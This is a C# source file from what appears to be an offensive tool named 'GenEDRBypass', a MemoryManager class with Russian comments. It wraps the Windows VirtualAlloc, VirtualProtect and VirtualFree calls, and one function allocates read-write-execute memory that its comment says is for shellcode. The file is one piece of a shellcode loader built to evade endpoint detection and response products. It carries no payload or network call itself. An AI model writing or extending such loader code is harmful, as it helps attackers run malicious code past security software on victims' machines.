using System;
using System.Runtime.InteropServices;

namespace GenEDRBypass.Core
{
    public static class MemoryManager
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        // Функция для выделения памяти под шеллкод
        public static IntPtr AllocateExecutableMemory(uint size)
        {
            IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x40);
            if (allocatedMemory == IntPtr.Zero)
                throw new Exception("Не удалось выделить память.");
            
            Console.WriteLine($"Память выделена по адресу: {allocatedMemory}");
            return allocatedMemory;
        }

        // Функция для изменения защиты памяти
        public static void ProtectMemory(IntPtr address, uint size, uint newProtect)
        {
            uint oldProtect;
            if (!VirtualProtect(address, size, newProtect, out oldProtect))
                throw new Exception("Не удалось изменить защиту памяти.");

            Console.WriteLine($"Защита памяти изменена на: {newProtect}");
        }

        // Освобождение выделенной памяти
        public static void FreeMemory(IntPtr address, uint size)
        {
            if (!VirtualFree(address, size, 0x8000))
                throw new Exception("Не удалось освободить память.");

            Console.WriteLine($"Память освобождена по адресу: {address}");
        }
    }
}
